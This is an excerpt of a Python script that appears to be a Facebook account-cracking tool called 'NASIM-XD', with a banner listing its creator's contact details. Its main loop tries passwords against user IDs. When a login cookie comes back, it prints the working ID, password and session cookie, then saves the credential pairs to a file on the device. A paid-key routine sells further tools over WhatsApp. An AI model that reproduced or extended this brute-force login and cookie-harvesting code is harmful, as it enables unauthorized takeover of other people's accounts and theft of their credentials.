...
NNNNNNNN        NNNNNNNN               AAA                 SSSSSSSSSSSSSSS IIIIIIIIIIMMMMMMMM               MMMMMMMM
N:::::::N       N::::::N              A:::A              SS:::::::::::::::SI::::::::IM:::::::M             M:::::::M
N::::::::N      N::::::N             A:::::A            S:::::SSSSSS::::::SI::::::::IM::::::::M           M::::::::M
N:::::::::N     N::::::N            A:::::::A           S:::::S     SSSSSSSII::::::IIM:::::::::M         M:::::::::M
N::::::::::N    N::::::N           A:::::::::A          S:::::S              I::::I  M::::::::::M       M::::::::::M
N:::::::::::N   N::::::N          A:::::A:::::A         S:::::S              I::::I  M:::::::::::M     M:::::::::::M
N:::::::N::::N  N::::::N         A:::::A A:::::A         S::::SSSS           I::::I  M:::::::M::::M   M::::M:::::::M
N::::::N N::::N N::::::N        A:::::A   A:::::A         SS::::::SSSSS      I::::I  M::::::M M::::M M::::M M::::::M
N::::::N  N::::N:::::::N       A:::::A     A:::::A          SSS::::::::SS    I::::I  M::::::M  M::::M::::M  M::::::M
N::::::N   N:::::::::::N      A:::::AAAAAAAAA:::::A            SSSSSS::::S   I::::I  M::::::M   M:::::::M   M::::::M
N::::::N    N::::::::::N     A:::::::::::::::::::::A                S:::::S  I::::I  M::::::M    M:::::M    M::::::M
N::::::N     N:::::::::N    A:::::AAAAAAAAAAAAA:::::A               S:::::S  I::::I  M::::::M     MMMMM     M::::::M
N::::::N      N::::::::N   A:::::A             A:::::A  SSSSSSS     S:::::SII::::::IIM::::::M               M::::::M
N::::::N       N:::::::N  A:::::A               A:::::A S::::::SSSSSS:::::SI::::::::IM::::::M               M::::::M
N::::::N        N::::::N A:::::A                 A:::::AS:::::::::::::::SS I::::::::IM::::::M               M::::::M
NNNNNNNN         NNNNNNNAAAAAAA                   AAAAAAASSSSSSSSSSSSSSS   IIIIIIIIIIMMMMMMMM               MMMMMMMM
                                                                                                                    
                                                                                                                    
                                                                                                                    
                                                                                                           
\033[1;91m--------------------------------------------
\033[1;91m[] CREATOR   > MD NASIM MIA
\033[1;91m[] FACEBOOK  > MD Nasim Mia
\033[1;91m[] GITHUB    > nasimblog41
\033[1;91m[] VERSION   > FREE
\033[1;91m[] WHATSAPP  > +01768576918
\033[1;91m-------------------------------------------"""  )
...
def menu():
	...
	if _____NASIM_____ in ['1']:
		C1()
	if _____NASIM_____ in ['2']:
		Y2()
	if _____NASIM_____ in ['3']:
		BER()
	if _____NASIM_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100000448332183")
	if _____NASIM_____ in ['0']:
		exit()
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mNASIM-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/NASIM-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	else:
        	    continue
        loop+=1
        sys.stdout.write('\r%s[NASIM-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801768576918?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20SAMIR%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
